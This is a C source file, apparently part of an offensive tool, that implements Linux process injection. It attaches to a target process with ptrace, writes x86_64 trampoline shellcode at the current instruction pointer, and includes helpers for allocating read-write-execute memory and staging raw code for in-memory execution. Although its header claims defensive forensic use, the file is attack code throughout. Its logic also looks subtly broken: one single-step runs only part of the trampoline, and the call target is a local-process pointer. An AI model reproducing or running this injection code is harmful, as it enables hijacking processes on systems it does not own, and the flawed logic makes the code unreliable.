/*
 * Execution: Linux Process Injection
 *
 * Injects code into a running process using ptrace.
 * Linux only - defensive forensic use.
 */

#ifndef _WIN32

#include "jocky_rt.h"
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

/* x86_64 shellcode that calls a function pointer and returns */
static const uint8_t trampoline_code[] = {
    /* push rdi                    */ 0x57,
    /* push rsi                    */ 0x56,
    /* push rdx                    */ 0x52,
    /* push rcx                    */ 0x51,
    /* push r8                     */ 0x41, 0x50,
    /* push r9                     */ 0x41, 0x51,
    /* push r10                    */ 0x41, 0x52,
    /* push r11                    */ 0x41, 0x53,
    /* movabs rax, <function_ptr>  */ 0x48, 0xB8,
    /* function pointer (8 bytes)  */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    /* call rax                    */ 0xFF, 0xD0,
    /* pop r11                     */ 0x41, 0x5B,
    /* pop r10                     */ 0x41, 0x5A,
    /* pop r9                      */ 0x41, 0x59,
    /* pop r8                      */ 0x41, 0x58,
    /* pop rcx                     */ 0x59,
    /* pop rdx                     */ 0x5A,
    /* pop rsi                     */ 0x5E,
    /* pop rdi                     */ 0x5F,
    /* ret                         */ 0xC3
};

#define TRAMPOLINE_SIZE sizeof(trampoline_code)

/* Attach to process and inject code */
bool jocky_linux_inject_code(pid_t target_pid, void* function_ptr, void** remote_addr)
{
    /* 1. Attach to target process */
    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) < 0) {
        fprintf(stderr, "[!] ptrace attach failed: %s\n", strerror(errno));
        return false;
    }
    
    int status;
    if (waitpid(target_pid, &status, 0) < 0) {
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return false;
    }
    
    /* 2. Read current registers */
    struct user_regs_struct regs, orig_regs;
    if (ptrace(PTRACE_GETREGS, target_pid, NULL, &regs) < 0) {
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return false;
    }
    memcpy(&orig_regs, &regs, sizeof(regs));
    
    /* 3. Find injection point - use current RIP or allocate memory */
    /* For simplicity, we inject at current RIP */
    unsigned long inject_addr = regs.rip;
    
    /* 4. Save original code */
    unsigned long orig_code[TRAMPOLINE_SIZE / sizeof(long) + 1];
    memset(orig_code, 0, sizeof(orig_code));
    
    for (size_t i = 0; i < TRAMPOLINE_SIZE; i += sizeof(long)) {
        errno = 0;
        orig_code[i / sizeof(long)] = ptrace(PTRACE_PEEKTEXT, target_pid,
                                              (void*)(inject_addr + i), NULL);
        if (errno != 0) {
            ptrace(PTRACE_SETREGS, target_pid, NULL, &orig_regs);
            ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
            return false;
        }
    }
    
    /* 5. Prepare trampoline with function pointer */
    uint8_t trampoline[TRAMPOLINE_SIZE];
    memcpy(trampoline, trampoline_code, TRAMPOLINE_SIZE);
    
    /* Patch function pointer into trampoline (offset 14) */
    memcpy(trampoline + 14, &function_ptr, sizeof(void*));
    
    /* 6. Write trampoline */
    for (size_t i = 0; i < TRAMPOLINE_SIZE; i += sizeof(long)) {
        unsigned long word = 0;
        memcpy(&word, trampoline + i, sizeof(long));
        if (ptrace(PTRACE_POKETEXT, target_pid,
                   (void*)(inject_addr + i), (void*)word) < 0) {
            /* Restore original code on failure */
            for (size_t j = 0; j < i; j += sizeof(long)) {
                ptrace(PTRACE_POKETEXT, target_pid,
                       (void*)(inject_addr + j), (void*)orig_code[j / sizeof(long)]);
            }
            ptrace(PTRACE_SETREGS, target_pid, NULL, &orig_regs);
            ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
            return false;
        }
    }
    
    /* 7. Single step to execute trampoline */
    if (ptrace(PTRACE_SINGLESTEP, target_pid, NULL, NULL) < 0) {
        /* Restore */
        for (size_t i = 0; i < TRAMPOLINE_SIZE; i += sizeof(long)) {
            ptrace(PTRACE_POKETEXT, target_pid,
                   (void*)(inject_addr + i), (void*)orig_code[i / sizeof(long)]);
        }
        ptrace(PTRACE_SETREGS, target_pid, NULL, &orig_regs);
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return false;
    }
    
    waitpid(target_pid, &status, 0);
    
    /* 8. Restore original code */
    for (size_t i = 0; i < TRAMPOLINE_SIZE; i += sizeof(long)) {
        ptrace(PTRACE_POKETEXT, target_pid,
               (void*)(inject_addr + i), (void*)orig_code[i / sizeof(long)]);
    }
    
    /* 9. Restore registers */
    ptrace(PTRACE_SETREGS, target_pid, NULL, &orig_regs);
    
    /* 10. Detach */
    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
    
    if (remote_addr) *remote_addr = (void*)inject_addr;
    return true;
}

/* Map executable memory in current process for shellcode */
void* jocky_linux_alloc_rwx(size_t size)
{
    void* mem = mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) return NULL;
    return mem;
}

/* Simple memory-only code execution - allocate RWX, copy, execute */
bool jocky_linux_memexec(const uint8_t* code, size_t code_size, void** entry_point)
{
    void* mem = jocky_linux_alloc_rwx(code_size);
    if (!mem) return false;
    
    memcpy(mem, code, code_size);
    
    /* Flush instruction cache */
    __builtin___clear_cache((char*)mem, (char*)mem + code_size);
    
    if (entry_point) *entry_point = mem;
    return true;
}

#endif /* !_WIN32 */
